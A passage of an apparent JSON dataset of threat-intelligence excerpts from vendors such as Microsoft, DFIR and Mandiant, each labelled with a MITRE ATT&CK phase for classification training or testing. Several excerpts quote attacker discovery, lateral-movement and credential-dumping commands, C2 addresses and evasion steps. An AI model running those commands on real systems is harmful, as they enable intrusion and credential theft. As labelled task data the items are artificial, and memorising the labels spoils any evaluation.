        "input": "Described attack activity: XorDdos propagates primarily via SSH brute force. It uses a malicious shell script to try various root credential combinations across thousands of servers until finding a match on a target Linux device. As a result, we see many failed sign-in attempts on devices successfully infected by the malware: \nOur analysis determined two of XorDdos' methods for initial access. The first method involves copying a malicious ELF file to temporary file storage /dev/shm and then running it. Files written at /dev/shm are deleted during system restart, thus concealing the source of infection during forensic analysis. \nThe second method involves running a bash script that performs the following activities via the command line: \n1. Iterates the following folders to find a writable directory: \n/bin o /home o /root o /tmp /usr /etc \n2. If a writable directory is found, changes the working directory to the discovered writable directory. \n3. Uses the curl command to download the ELF file payload from the remote location hxxp://Ipv4PII_777789ffaa5b68638cdaea8ecfa10b24b326ed7d/1[.]txt and saves the file as  ygljglkjgfg0.   \n4. Changes the file mode to \"executable\".   \n5. Runs the ELF file payload.   \n6. Moves and renames the Wget binary to evade rule-based detections triggered by malicious usage of the Wget binary. In this case, it renames the Wget binary to good and moves the file to the following locations: mv /usr/bin/wget /usr/bin/good mv /bin/wget /bin/good   \n7. Attempts to download the ELF file payload for a second time, now only using the file good and not the Wget binary.   \n8. After running the ELF file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character: \nWhichever initial access method is used, the result is the same: the running of a malicious ELF file, which is the XorDdos malware. In the next section, we do a deep dive into the XorDdos payload. \nOther XorDdos variants that we recently saw in our investigations use this bash script installation method to either download or build its rootkit remotely. This installation method differentiates itself by matching the kernel build of the target device with the rootkit available on the attacker's command and control (C2) server. \nAfter enumerating the target device, the script communicates with the attacker's C2 server, and checks if a rootkit that matches the kernel build of the target device exists on the server. If it finds an existing rootkit that matches with the target device, the script downloads the rootkit. The following steps initiate the matching and downloading of the XorDdos malware and rootkit: \n1. The bash script gets the target device's kernel-related information using the following sequence of commands and sends it to the attacker's server: lsmod with tail to get the list of loaded Linux kernel modules Modinfo extracts the vermagic number, a string containing information such as the kernel version number and CPU type used by the kernel module to load into kernel space. The vermagic number is gathered from the listed kernel modules. \n2. The vermagic string is sent to the attacker's server in encoded form. \n3. If the rootkit binary specific to the kernel build exists on the server, it is downloaded along with the XorDdos ELF as a compressed .tar file. 4. The .tar file is further uncompressed in a new directory named after the string obtained by encoding the MD5 hash of the vermagic string and created under the location /tmp on the target device. After the .tar file is uncompressed, the XorDdos ELF malware installs the XorDdos rootkit. \nIf the kernel build of the target device does not match any of the rootkits on the attacker's server, the bash script initiates the following steps to build and compile the rootkit remotely: \n1. The bash script prepares archived Linux kernel headers in the /tmp directory. Linux kernel headers are defining C-language public kernel APIs and data structures to enable compilation of 3rd party kernel modules.   \n2. The bash script downloads and launches the ELF binary uploader in /tmp. This binary uses an HTTP POST request to upload the archived kernel headers to the attacker's server.   \n3. The ELF binary removes the uploader component from /tmp to minimize XorDdos' footprint.   \n4. The uploaded archived kernel headers are used on the C2 server to build and compile the rootkit component. Thus, the newly built rootkit component becomes available for download from the C2 server, also making it available for other future infections.   \n5. The bash script then initiates the prior set of steps to download and install the XorDdos ELF malware, which installs the rootkit into the target device. ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Qbot is widely known tosteal emailswith the intention of collecting information and performing email thread hijacking.\nEmail data will be collected and stored in 1 of 2 locations.\nOnce exfiltrated from the system this folder is then deleted as seen below\nCollection of browser data from Internet Explorer and Microsoft Edge was also observed with Qbot using the built-in utility esentutl.exe.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The most common initial access vectors in 2023 involved stolen credentials or the exploitation of vulnerabilities in public-facing infrastructure (Figure 10). In numerous incidents, the first evidence of network compromise was an actor's authentication to the victim's virtual private network (VPN) either through possession of legitimate credentials or a successful brute-force attack. We also observed a slight increase in brute-force attacks in 2023 compared to 2022. \nIn almost $40\\%$ of incidents where the initial access vector was identified, threat actors used ",
        "output": "initial access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In early 2022, Mandiant predicted that Russian cyber threat activity associated with the invasion of Ukraine would affect government and private sector targets in third-party countries, particularly neighboring countries, North Atlantic Treaty Organization (NATO) allies, and other nations voicing support for Ukraine. Russian governmentlinked actors have historically employed false hacktivist facades as a means of obscuring their role in targeting Western countries. Mandiant has previously identified instances of self-proclaimed hacktivist groups coordinating with such actors in the context of the war. \nWhile we have not observed direct ties between KillNet and the Russian government, we cannot exclude the possibility of coordination, or more substantial ties, between some or all groups comprising the collective. We expect KillNet and its affiliates to continue conducting distributed denialof-service (DDoS) and hack-and-leak operations intended to disrupt government and critical infrastructure functions in countries providing financial, economic, diplomatic or military support to Ukraine. \nMandiant has tracked KillNet activity back to January 2022, despite a claim by the collective's alleged founder that it began operations in 2021. This claim could be an attempt to separate the group from Russian government interests and establish its legitimacy as a genuine hacktivist collective.   \nThe collective has claimed responsibility for DDoS attacks, data theft, and leaks against entities across multiple industries, including transportation, defense, government and military, financial services, global institutions, and telecommunications.   \nKillNet's targeting has consistently aligned with established and emerging Russian geopolitical priorities, which suggests that at least part of \nthe influence component of this hacktivist activity is intended to directly promote Russia's interests within perceived adversary nations visa-vis the invasion of Ukraine. The collective's activity also supports domestic Russian promotion of support for the war. As Russian government rhetoric has focused on various nations, we observed the group claim attacks targeting those same nations shortly thereafter. \nSince the beginning of 2023, the majority of observed KillNet targeting has focused on the U.S., Europe, and international institutions such as NATO. We have previously observed targeting in countries including Germany, Denmark, Sweden, France, Poland, Slovakia, Ukraine, Israel, the United Arab Emirates (UAE), and other NATO ally and partner countries such as Japan. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: HAFNIUM primarily targets entities in the United States across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs. \nHAFNIUM has previously compromised victims by exploiting vulnerabilities in internet-facing servers, and has used legitimate open-source frameworks, like Covenant, for command and control. Once they've gained access to a victim network, HAFNIUM typically exfiltrates data to file sharing sites like MEGA. \nIn campaigns unrelated to these vulnerabilities, Microsoft has observed HAFNIUM interacting with victim Office 365 tenants. While they are often unsuccessful in compromising customer accounts, this reconnaissance activity helps the adversary identify more details about their targets' environments. \nHAFNIUM operates primarily from leased virtual private servers (VPS) in the United States. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In several Raspberry Robin detections, we have seen msiexec.exe go on to install a malicious DLL file. At this time we are not certain what the DLL does.. We suspect it may establish persistence on the victim's system. In the detections we saw, the malicious files were created as C:\\Windows\\Installer\\MSI $^{\\ast\\ast\\ast\\ast\\ast}$ .tmp files. In one case, a file with the same hash was also created as C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku. \nExamples: \nC:\\Windows\\Installer\\MSI5C01.tmp C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku   \no Shared MD5 hash: 6f5ea8383bc3bd07668a7d24fe9b0828 VirusTotal example C:\\Windows\\Installer\\MSIE160.tmp   \no MD5 hash: e8f0d33109448f877a0e532b1a27131a VirusTotal example ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As mentioned in the Execution section, the IcedID process ran several initial discovery commands that provided environmental information about the host, network, and domain, to the threat actor. Given the timing of these commands were immediately after the execution of IcedID, we believe these commands were executed automatically upon check-in.\ncmd.exe /c chcp >&2 \nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List \nipconfig /all \nsysteminfo \nnet config workstation \nnltest /domain_trusts \nnltest /domain_trusts /all_trusts \nnet view /all /domain \nnet view /all \nnet group \"Domain Admins\" /domain\nAcmd.exeprocess spawned from IcedID which ran additional discovery queries. The threat actor dropped the following files in C:\\Windows\\Temp directory:\n7.exe (7zip) \nadfind.exe (AdFind) \nadfind.bat (pictured below)\nThe actor used the Active Directory enumeration toolAdFindto collect information such as the users, computers and subnets in the domain.\nThe filead.7z, was the resulting output of the AdFind commands above. After that, an additional batch script was created,ns.bat, which enumerated all host names in the domain withnslookupto identify the IP address of the host.\nPrior to the first lateral movement from the beachhead host, the threat actor tested credentials and gathered information from their targeted remote server using WMI",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon execution of Base-Update.exe, it proceeds to download, Base64-decode, and execute another time stomped downloader written in Go from http://194.31.98.124:443/i with the arguments a 0CyCcrhI/6B5wKE8XLOd+w $==$ : \n%TEMP%\\java-sdk.exe (MD5: 36ff9ec87c458d6d76b2afbd5120dfae) Downloader written in Go Base64 encoded - MD5: 2f14b3d5ab01568e2707925783f8eafe Compile time: 1970-01-01 00:00:00 C&C: 194.31.98.124:443 \nJava-sdk.exe sets persistence for itself via setting a Run registry key. It then proceeds to download, decode, and execute two additional Base64- encoded files, GRIMPLANT and GRAPHSTEEL. \noracle-java.exe (MD5:   \n4a5de4784a6005aa8a19fb0889f1947a) GRIMPLANT backdoor Base64-encoded  MD5: 2a843511cdb8f5604cb3fafe244ef5f2 Compile time: 1970-01-01 00:00:00 C&C: http://194.31.98.124:80   \nmicrosoft-cortana.exe (MD5:   \n6b413beb61e46241481f556bb5cdb69c)   \nGRAPHSTEEL infostealer \nEvacuation and Humanitarian Documents used to Spear Phish Ukrainian Entities | Mandiant | Google Cloud Blog \nBase64-encoded  MD5: a0c4ddf9c6f95d7046be8a2e0f875935 Compile time: 2022-03-20 14:24:42 C&C: ws://194.31.98.124:443/c ",
        "output": "execution",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor was observed creating remote services in order to execute beacon DLL files transferred via SMB as SYSTEM on remote hosts.\nIn another instance, an executable Cobalt Strike beacon was copied via SMB to a target machine, and then executed via WMI.\nLastly, traces of RDP (Remote Desktop Protocol) connections were discovered on multiple compromised hosts utilized for lateral movement on the final day of the intrusion and during the ransomware deployment.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Our telemetry suggests that Earth Estries gains initial access to their target's system by exploiting vulnerabilities in outside-facing services or remote management utilities.\nThe group has been observed to take advantage of either vulnerable or misconfigured QConvergeConsole installations in one of its target's servers to gain access to their system. The installed remote application agent (c:\\program files\\qlogic corporation\\nqagent\\netqlremote.exe) can perform network discovery and install Cobalt Strike on a target machine.\nCommandsC:\\Windows\\system32\\cmd.exe /C net group \"domain admins\" /domainC:\\Windows\\system32\\cmd.exe /C copy C:\\users\\public\\music\\go4.cab \\\\{HostName}\\c$\\programdata\\microsoft\\drmC:\\Windows\\system32\\cmd.exe /C expand -f:* \\\\{HostName}\\c$\\programdata\\microsoft\\drm\\go4.cab \\\\{HostName}\\c$\\programdata\\microsoft\\drmC:\\Windows\\system32\\cmd.exe /C c:\\users\\public\\music\\PsExec.exe -accepteula \\\\172.16.xx.xx \"c:\\ProgramData\\Microsoft\\DRM\\g2.bat\"\nIn another instance, they made used a vulnerability in Apache Tomcat6 bundled with QConvergeConsole (c:\\program files (x86)\\qlogic corporation\\qconvergeconsole\\tomcat-x64\\apache-tomcat-6.0.35\\bin\\tomcat6.exe) to perform lateral movement activities and operation of later stage tools:\nCommandsC:\\Windows\\system32\\cmd.exe /C wmic /node:172.16.xx.xx process call create \"cmd.exe /c c:\\ProgramData\\Microsoft\\DRM\\182.bat\"C:\\Windows\\system32\\cmd.exe /C C:\\Users\\Public\\Music\\rar.exe a -m5 C:\\Users\\Public\\Music\\pdf0412.rar C:\\Users\\Public\\Music\\temp\\*.pdf",
        "output": "initial access",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Raspberry Robin is typically introduced via infected removable drives, often USB devices. The Raspberry Robin worm often appears as a shortcut .lnk file masquerading as a legitimate folder on the infected USB device. \nSoon after the Raspberry Robin infected drive is connected to the system, the UserAssist registry entry is updated and records execution of a ROT13-ciphered value referencing a .lnk file when deciphered. In the example below, q:\\erpbirel.yax deciphers to d:\\recovery.lnk. \nProcessspawned \n2022-02-20 14:43:14.525 GMT regmod First wrote to\\registry\\user\\s-1-5-21-432587278-3 21508835-1117227555-53619\\software\\micr0soft\\windo ws\\currentversion\\explorer\\userassist\\{f4c57c4b-20 46-46f0-a9eb-443bcko33d9f}\\count\\q:\\erpbirel.yax \nFigure 2: Registry modification with ROT13 . Lnk file ",
        "output": "initial access",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Lazagnewas used with the \"all\" switch, which runs all modules.\nBelow we can see registry hives being saved to disk.\nLSASS was accessed by rundll32, but we did not see anything written to disk.\nTrickbot was used to enable the storage of clear text credentials (WDigest) by setting UseLogonCredential to 1.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cybercriminals who are outed by security researchers must update their tools in order to continue to operate successfully. As defenders, we can learn a lot from the updates made by these cybercriminals. The tools used by TeamTNT demonstrate that cybercriminals are increasingly comfortable attacking modern environments such as Docker, Kubernetes and public cloud providers, which have traditionally been avoided by other cybercriminals who have instead focused on on-premise or mobile environments. Successfully deploying malware in these modern environments requires cybercriminals to get creative when it comes to avoiding detection, as we can see from TeamTNT's efforts to disable cloud security services. Network defenders must also get creative when it comes to implementing new forms of detection and monitoring if we are to ensure the ongoing security of these systems. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We did not witness exfiltration in the clear during this case but we have recently become aware of Ryuk threat actors exfiltrating information over the Cobalt Strike C2 channel.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Sofacy group, also known as APT28, is a well-known threat group that frequently conducts cyber espionage campaigns. Recently, Unit 42 identified a spear phishing e-mail from the Sofacy group that targeted the United States government. The e-mail was sent from a potentially compromised account belonging to the Ministry of Foreign Affairs of another government entity and carried the Carberp variant of the Sofacy Trojan. The developer implemented a clever persistence mechanism in the Trojan, one which had not been observed in previous attacks. The focus of this blog will be on the attacks and the infrastructure associated with Sofacy using the new persistence mechanism as a correlation point.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: BazarLoader:\n34.219.130.241:443\n13.56.161.214:443\nCobalt Strike:\nsammitng.com (162.244.83.216)  This Cobalt Strike server was added to ourThreat Feedon 07/01/2021.\nThis server was seen communicating with multiple internal systems:\nIn addition to these command and control methods, one more network anomaly was observed. This was not used for primary command and control and the amount of data sent was small so we do not know the full intentions of the activity but several critical systems like domain controllers and file servers made connections to TOR nodes initiated by the threat actors.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: OnceIcedIDwas downloaded to the host, the malware was executed using rundll32.exe\nAfter execution, the malware made contact with 161.35.109[.]168 which it continued to beacon to, throughout the intrusion.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Our research on the framework vulnerabilities began while trying to better understand how a pre-installed System application could affect the overall security of mobile devices. We discovered that the framework, which is used by numerous apps, had a \"BROWSABLE\" service activity that an attacker could remotely invoke to exploit several vulnerabilities that could allow adversaries to implant a persistent backdoor or take substantial control over the device. \nThe framework seemed to be designed to offer self-diagnostic mechanisms to identify and resolve issues impacting the Android device, indicating its permissions were inherently broad with access to valuable resources. For example, the framework was authorized to access system resources and perform system-related tasks, like adjusting the device's audio, camera, power, and storage controls. Moreover, we found that the framework was being used by default system applications to leverage its self-diagnostic capabilities, demonstrating that the affiliated apps also included extensive device privileges that could be exploited via the vulnerable framework. \nAccording to mce Systems, some of these vulnerabilities also affected other apps on both Android and iOS devices. Moreover, the vulnerable framework and affiliated apps were found on devices from large international mobile service providers. mce Systems, which offers \"Mobile Device Lifecycle and Automation Technologies,\" also permitted providers to customize and brand their respective mobile apps and frameworks. Pre-installed frameworks and mobile apps such as mce Systems' are beneficial to users and providers in areas like simplifying the device activation process, troubleshooting device issues, and optimizing performance. However, their extensive control over the device to deliver these kinds of services could also make them an attractive target for attackers. \nOur analysis further found that the apps were embedded in the devices' system image, suggesting that they were default applications installed by phone providers. All of the apps are available on the Google Play Store where they go through Google Play Protect's automatic safety checks, but these checks previously did not scan for these types of issues. As part of our effort to help ensure broad protection against these issues, we shared our research with Google, and Google Play Protect now identifies these types of vulnerabilities. \nWe initially discovered the vulnerabilities in September 2021 and shared our findings with mce Systems and affected mobile service providers through Coordinated Vulnerability Disclosure (CVD) via Microsoft Security Vulnerability Research (MSVR). We worked closely with mce Systems' security and engineering teams to mitigate these vulnerabilities, which included mce Systems sending an urgent framework update to the impacted providers and releasing fixes for the issues. At the time of publication, there have been no reported signs of these vulnerabilities being exploited in the wild. \nThe high-severity vulnerabilities, which have a Common Vulnerability Scoring System (CVSS) score of 7.0-8.9, are now identified as CVE-2021-42598, CVE-2021- 42599, CVE-2021-42600, and CVE-2021-42601. We want to thank mce Systems' engineering teams for collaborating quickly and efficiently in resolving these issues as well as to AT&T for proactively working with Microsoft to ensure customers can safely continue to use the framework. \nSeveral other mobile service providers were found using the vulnerable framework with their respective apps, suggesting that there could be additional providers still undiscovered that may be impacted. The affected providers linked below have made updated app versions available to users before this disclosure, ensuring devices can be protected before these vulnerabilities could be exploited. We encourage these providers' customers to update to the latest versions of these apps from the Google Play store, which include but are not limited to: com.telus.checkup, com.att.dh com.fivemobile.myaccount, com.freedom.mlp,uat, and com.ca.bell.contenttransfer. \nAdditionally, the package com.mce.mceiotraceagent might be installed by several mobile phone repair shops. Mobile users are advised to look for that app name and remove it from their phone, if found. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Volt Typhoon actors rarely use malware for post-compromise execution. Instead, once Volt Typhoon actors gain access to target environments, they use hands-on-keyboard activity via the command-line [T1059] and other native tools and processes on systems [T1218] (often referred to as \"LOLBins\"), known as LOTL, to maintain and expand access to the victim networks. According to industry reporting, some \"commands appear to be exploratory or experimental, as the operators [i.e., malicious actors] adjust and repeat them multiple times.\"[2] \nFor more details on LOTL activity, see the Credential Access and Discovery sections and Appendix A: Volt Typhoon LOTL Activity. \nSimilar to LOTL, Volt Typhoon actors also use legitimate but outdated versions of network admin tools. For example, in one confirmed compromise, actors downloaded [T1105] an outdated version of comsvcs.dll on the DC in a non-standard folder. comsvcs.dll is a legitimate Microsoft Dynamic Link Library (DLL) file normally found in the System32 folder. The actors used this DLL with MiniDump and the process ID of the Local Security Authority Subsystem Service (LSASS) to dump the LSASS process memory [T1003.001] and obtain credentials (LSASS process memory space contains hashes for the current user's operating system (OS) credentials). \nThe actors also use legitimate non-native network admin and forensic tools. For example, Volt Typhoon actors have been observed using Magnet RAM Capture (MRC) version 1.20 on domain controllers. MRC is a free imaging tool that captures the physical memory of a computer, and Volt Typhoon actors likely used it to analyze in-memory data for sensitive information (such as credentials) and in-transit data not typically accessible on disk. Volt Typhoon actors have also been observed implanting Fast Reverse Proxy (FRP) for command and control.[3] (See the Command and Control section). ",
        "output": "execution",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For those samples the following behavior occurred.\nIn the registry location seen referenced below, there could be found more modules for the malware to call upon.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the 6th day, the threat actors began their lateral movement activity using SMB to transfer Cobalt Strike DLL's onto a domain controller and another server.Services were then created on the hosts to execute the uploaded Cobalt Strike Beacons.On the final day, right before execution of the ransomware, SMB was again used to transfer Cobalt Strike Beacon executable to the domain controllers.The beacons were then executed using a remote service.Known Cobalt Strike named pipes were observed on the Domain Controllers with these executable beacons. Named pipes connections can be observed through Sysmon Event ID 18. Note that the named pipes followedMSSE-[0-9]{4}-serverpattern, which indicates that the threat actors were using the default Cobalt Strike Artifact Kit binaries:\nCommand and ControlWe observed the IcedID DLL dropping multiple CS beacons on the beachhead.Splashtop StreamerThreat actors used Splashtop Streamer via Atera agent, allowing them to remotely connect to machines without using RDP tunneling or other techniques previously seen in our cases. By default, the Splashtop Streamer is automatically installed together with the AteraAgent.Splashtop Streamer usage leaves many network connections to *.api.splashtop.com and *.relay.splashtop.com on port 443:Cobalt StrikeWe observed a default Cobalt Strike malleable C2 profile, using the jquery agent string. This activity can be detected with relative ease by theET rules.There appeared to be no jitter configured, resulting in a constant stream of HTTP requests, and if using ET rules, constant alerts would be generated.Just based on the ET Cobalt Strike rule, 'ET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response', there were in excess of 6K alerts generated. Due to the length of this intrusion, we observerd the threat actors handing off between C2 servers. We also observed one Cobalt Strike domain change IP resolutions three times, over the length of the case.IcedID:\nCobalt Strike:\nA configuration was not obtained for this server.ExfiltrationWe did not observe any exfiltration indicators while analyzing host and network forensic artifacts. This does not mean that there was no exfiltration, as this could have been performed via Cobalt Strike beacons over encrypted channels.ImpactOn the 19th day of the intrusion, the threat actors prepared for their final objectives. From the beachhead host, the directory listings of the domain controllers were checked again, followed by the backup server. On the beachhead host, we observed the threat actors attempt to execute the final ransomware payload. From that host however the attempt failed. The threat actors then proceeded to look for other elevation paths. After a failed attempt with CVE-2021-42278 and CVE-2021-42287, the threat actors executed Cobalt Strike beacons on a couple of domain controllers. Once they established this access, around twenty minutes later, they again attempted the ransomware deployment and this time the payload executed properly and began spreading across the network via SMB. The threat actors deployed ransomware payload in a DLL, named x64.dll, which was executed using backup.bat batch script.This x64.dll DLL contains fingerprints, \"conti_v3.dll\", seen in ourprevious cases:We didn't dig into reversing this DLL, asa detailed step-by-step analysis already exists, and gives an excellent explanation of command line parameters used during the execution of Conti ransomware. Once the threat actors pushed the encryptor to C$, an excessive SMB network activity were generated in a short period of time (~7K) as indicated by the chart.This resulted in files being encrypted and a 'readme.txt' ransom note generated on the hosts:The ransom note has slightly been modified from our last Conti cases:IndicatorsNetwork\nFile\nDetectionsSuricata\nSigmahttps://github.com/SigmaHQ/sigma/blob/a3eed2b760abddfd62014fcf9ae81f435b216473/rules/windows/process_access/proc_access_win_lsass_memdump.ymlhttps://github.com/SigmaHQ/sigma/blob/11b6b24660c045bb907ed43cfe007349764173bc/rules/windows/powershell/powershell_script/posh_ps_powerview_malicious_commandlets.ymlhttps://github.com/SigmaHQ/sigma/blob/071bcc292362fd3754a2da00878bba4bae1a335f/rules/windows/process_creation/proc_creation_win_ad_find_discovery.ymlhttps://github.com/SigmaHQ/sigma/blob/6b3fc11a48e8aa2773dfe266c3be11e4c4c973a5/rules/windows/process_creation/proc_creation_win_powershell_defender_disable_feature.ymlhttps://github.com/SigmaHQ/sigma/blob/eb382c4a59b6d87e186ee269805fe2db2acf250e/rules/windows/builtin/security/win_admin_share_access.ymlhttps://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/builtin/application/win_software_atera_rmm_agent_install.ymlhttps://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rules/windows/process_creation/proc_creation_win_trust_discovery.ymlhttps://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/windows/process_creation/proc_creation_win_susp_recon_activity.ymlhttps://github.com/SigmaHQ/sigma/blob/e049058d14dd9ec09771b38ed4d59e8b49ba1bad/rules/windows/builtin/security/win_security_cobaltstrike_service_installs.yml",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Besides password related documents mentioned in credential access other sensitive files were accessed using WordPad. Some files of interest were legal-related files and folders such as Contracts.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors disabled Windows Defender using Local Group Policy Editor.\nLater, they also ran a PowerShell script that would again disable Windows Defender, this time using MpPreference. The script also targeted Malwarebytes, agents, Citrix, Exchange, Veeam, SQL and many other processes. Event ID 5001 was created due to Defender AV Real-Time being disabled.A Defender exclusion was also added to exclude everything with .exe as the extension.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While no plain text exfiltration was seen during this intrusion, canary documents were opened by the threat actors hours after the ransom, confirming that the hours spent on network before ransoming was used to gather files. The source IP's from these canary documents were also Tor exit nodes just like the RDP connections. Since no plaintext exfil was observed we assess that the exfiltration was performed via one of the command and control channels either RDP, Empire, or Koadic.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Modern industrial process control and automation systems rely on a variety of sophisticated control systems and safety functions. These systems and functions are often referred to as Industrial Control Systems (ICS) or Operational Technology (OT). \nA Distributed Control System (DCS) provides human operators with the ability to remotely monitor and control an industrial process. It is a computerized control system consisting of computers, software applications and controllers. An Engineering Workstation is a computer used for configuration, maintenance and diagnostics of the control system applications and other control system equipment. \nA SIS is an autonomous control system that independently monitors the status of the process under control. If the process exceeds the parameters that define a hazardous state, the SIS attempts to bring the process back into a safe state or automatically performs a safe shutdown of the process. If the SIS and DCS controls fail, the final line of defense is the design of the industrial facility, which includes mechanical protections on equipment (e.g. rupture discs), physical alarms, emergency response procedures and other mechanisms to mitigate dangerous situations. \nAsset owners employ varied approaches to interface their plant's DCS with the SIS. The traditional approach relies on the principles of segregation for both communication infrastructures and control strategies. For at least the past decade, there has been a trend towards integrating DCS and SIS designs for various reasons including lower cost, ease of use, and benefits achieved from exchanging information between the DCS and SIS. We believe TRITON acutely demonstrates the risk associated with integrated designs that allow bi-directional communication between DCS and SIS network hosts. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Data availability is a critical component of NFT success and immutability, and the current implementations fall short; the Ethereum-based NFT industry lacks a formal framework for where and \nhow to store NFT content. While the IPFS network is a popular option amongst NFT creators, the decision is ultimately left to the individual creator of each NFT, or the platform hosting the minting functions. Buyers must ask if it makes sense to spend any amount of money on an NFT with no guarantees the data will exist long-term. \nBlockchain technology promises inherent solutions to data confidentiality, integrity, and accessibility, yet it seems the commonly discussed issue of scalability remains. If a blockchain protocol can prove itself to be economically sound in its incentivization mechanisms and technically sound in its scalability, then it would position itself as a viable solution across not only the NFT market but a myriad of sectors and enterprise-level applications \u2013 where data security and availability are paramount to success. \nPosted in Threat Intelligence-Security & Identity ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor's keylogger used in the intrusion implemented a XOR operation to encode the contents of data written to logFileuyovaqv.bin.\nThe threat actor removed various files created by the discovery actions during the intrusion.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
